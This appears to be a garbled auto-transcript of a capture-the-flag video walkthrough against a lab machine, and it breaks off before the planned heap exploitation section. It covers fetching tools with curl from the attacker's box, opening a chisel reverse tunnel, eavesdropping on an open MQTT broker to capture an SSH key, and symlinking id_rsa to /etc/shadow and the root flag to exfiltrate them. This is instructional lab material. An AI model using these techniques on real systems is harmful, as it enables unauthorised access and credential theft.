SEF grep aggress and see what he does so he's executing the 8545 and also for dub dub dub server PHP please look at this we can see only he can write it so we can't exactly modify it doesn't look like there's anything we can do to get to him easily so the next thing to look at is this service so you can also run like piece by and see all the processes that are running on the box every minute let's see LS la grep do I have it I probably have it installed here piece by github and will download the small one where is releases there we go big static small save see dub dub dub MB downloads piece by and then we can download it so let's go to dev sh m curl 10 10 14 to 8 thousand piece by 64's i think that was a name yep chmod plus x and when we run it it will show all the files that start getting executed and we got a configuration file right off the bat base that looking and date how close are we well 15 seconds away from a new hour so as long as the time on our box and the server's correct any cron that would run in a minute should happen in five seconds in two seconds we should be seeing some things pop up in the terminal if four time was in sync or also if things are in every minute so nothing there let's go back into opt do we have chisel installed LSO a opt grep chisel I do not so let's go download chisel chisel github and is there release here there is downloads so if I just want the Linux x64 [Music] 386 and be 64 there we go save still oh we do have some things pop up so let's see cron MySQL and uploads thing so maybe there is some type of script that periodically uploads we got a Python root connections pi and root broadcast PI so based upon broadcast PI I'm going to be guessing there's some type of network traffic going on and I kill this and see if we can cat that file we can't so keep running that while we do chisel so let's go into dub-dub-dub move downloads chisel gzip - d let's rename this to just be chisel chmod plus x chisel and we can do chisel server - p i'll run it on port 8000 and we want to reverse thing what we're doing with chisel is oh I have HTTP server let's do 9000 - what we're doing a chisel is directing this port one eight eight three back to our local box so we can get rid of that go back to the curl and will download chisel all we need - oh and then we can do dot slash chisel chmod plus x chisel now dot slash chisel turn it to client mode connect to ten ten 14 to 49 thousand to create a reverse tunnel port one eight eight three one twenty seven zero zero one one eight eight three so what this is doing home VM let's do SSL NP graft 183 so we're not listening on this port right now point connect now we are so what this is doing is whenever we connect to local host port 183 it's going through chisel and then going out this end if you're confused I'd highly recommend going to if set dots typing in reddish and going over maybe reddish pool reddish I thought we could do spaces or PowerPoint there we go look through each of these and reddish to understand what we're doing but let's see the next thing we can do it's probably netcat or port so a net-net cat and map it's ohms again so let's go back to this pane and math - SC s V - P one eight eight three - n localhost we can read one two red shell and script execution failed use dash D to debug it's weird but Em's if we just netcat to that port so and see localhost 183 can't really do anything let's try doing with sudo because we got a em map script mqtt subscribed NSC and this MQTT that's trying to run but for some reason it's airing L bad argument to unpack yeah I'm not sure exactly why that's airing but sometimes an map does that so let's see mosquito sub MQTT so we want this to be able to run this command so essentially MQTT is I believe a message broker and it's kind of how like applications can talk to each other maybe like rabbitmq I kind of go over something like this in do I still have sect that rocks up sector rocks I think we have a katka thing I kind of go over this yeah in this video this attack is similar to what we did and the securing vendor Web Apps video which I'd recommend watching but I'm going to connect to the MQTT database and then subscribe to messages which allows us to listen so let's play that out app search must quit all I don't know what this is but let's see sudo apt install that and let's do the client as well clients weirdin that has an S on the end let's install this and see if it gives us that package we want which is subscribe so we can maybe Google my squid toe list I think it's called topics request all whoa I bet this is why the nmap script actually failed because we didn't have these binaries on the box and now let's try this again now that we have the binaries it may actually work or not so let's see connect to the server with subscribe that some squid toe underscore sub - - help there's a lot of options here so it subscribes to a set of topics and then prints all the messages it receives but we don't know the topics on this squid Oh what is this pool publish a request message and wait for response that's not it so if the actual end map command worked it would have listed a bunch of topics worth for us wouldn't be that helpful but it may have helped to make sense later if we do MQTT topics see what this is does this say wildcard so plus is a one level and multi-level is a hashtag so we can subscribe to all topics by doing MQ uh my squid oh sub - t for topic put a hashtag - h1 27001 - p1 8 8 3 so now we should be listening for any topic on the box there is one catch to that and that is topics beginning with a dollar sign the wild-card won't catch so we also want to do a second one and do this / and I think the cysts Opik sorry xored for like internal system like health use I believe so give this probably a minute and we may see something so whenever it checks and this one is probably why it had um when we looked at the piece by and saw the random firmware check looks like there's some automation going around to do that so hopefully we see this go again and then we can see other things in this system tab there we go checking firmware updates no updates and nothing I'm just gonna let this go for a few minutes to see if we get anything I'm pretty sure I should have had something and I think the actual topic insists and it begins in caps there we go almost instantly we get data back so yeah the system has is capital and it looks like whoops there is something here and it's saying retrieving key from the AWS instance and then we have an SSH key so we can grab this key and then try using it to log into SSH so V will call this AWS key paste chmod 600 I AWS key egress was a user at 10 10 10 170 nothing an observer was the second user and we get logged in so we found a key through just the message broker being open and there's actually a unintended route here to get stuff so let's go see des SH and we can overwrite this key so if I move IDR sa to IDRs a dot pack and we did like a symbolic link so route route text ID RSA we can't actually read ID RSA because it points over to route route text but if this script is grabbing this text file and then throwing it into the message broker and that script runs as route we'll be able to grab it so let's try shadow actually let's see shadow and if shadow works o RM ID RSA if shadow works then just know it would have worked for route text and there we go we have grabbed Etsy shadow off the box and if it had a weak password we could crack the root password and get in there's other files we could protential II grabbed maybe look for Cron's or things like that but I don't know if there's anything here that if we can read with root permissions we can use it to upgrade a shell in the box but that is just a fun unintended rail so let's be kind and restore this ID or s a thing and unfortunately I just edited the video to jump back to this port because I spent the next like six to seven hours trying to figure out a good way to explain heap and exploitation because we haven't covered that here before but it's just not a topic I'm super familiar with and I really don't like how that whole portion turned out and after doing recording for probably the better part of a day I'm just going to take a break and maybe sometime next week I'll revisit and we'll learn how to do some heap exploitation so I'm going to leave you off with the grabbing root text in case for some reason you didn't know what I was talking about earlier just create a symbolic link to that so let's move this IDRs a back-to-back create this and we'll wait for the program to read ID RSA and send it to MQTT and once it does that will get rid text and be able to call it a day so again I'm sorry for not be able to complete this machine but some things are just really hard to explain and walking through heap and objects and gdb is definitely not super easy to do and I don't know so that'd be the video I hope you guys enjoyed it take care and we'll see you all next week